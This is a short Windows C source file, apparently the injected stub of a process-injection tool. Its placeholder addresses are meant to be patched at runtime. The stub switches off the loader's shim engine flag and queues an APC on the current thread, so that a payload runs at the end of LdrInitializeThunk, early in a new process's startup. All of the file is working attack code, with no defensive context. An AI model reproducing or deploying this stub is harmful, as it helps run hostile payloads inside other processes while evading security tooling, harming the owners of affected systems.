#include <Windows.h>

#define NtCurrentThread() ( ( HANDLE ) ( LONG_PTR )-2 )
typedef NTSTATUS ( NTAPI* fn_NtQueueApcThread )(
    _In_     HANDLE ThreadHandle,
    _In_     PVOID  ApcRoutine,
    _In_opt_ PVOID  ApcArgument1,
    _In_opt_ PVOID  ApcArgument2,
    _In_opt_ PVOID  ApcArgument3
);

EXTERN_C VOID main(
    VOID
) {
    PBYTE g_ShimsEnabled = (PBYTE)0x9999999999999999;
    PVOID MmPayload      = (PVOID)0x8888888888888888;
    PVOID MmContext      = (PVOID)0x7777777777777777;

    //
    // disable the shim engine to avoid any more 
    // function pointers getting called that have
    // not been resolved 
    //
    *g_ShimsEnabled = FALSE;

    //
    // now we are going to queue an Apc in the current
    // thread which is going to be triggered at the end
    // of the LdrInitializeThunk routine 
    //
    ((fn_NtQueueApcThread)0x6666666666666666)( NtCurrentThread(), MmPayload, MmContext, nullptr, nullptr );
}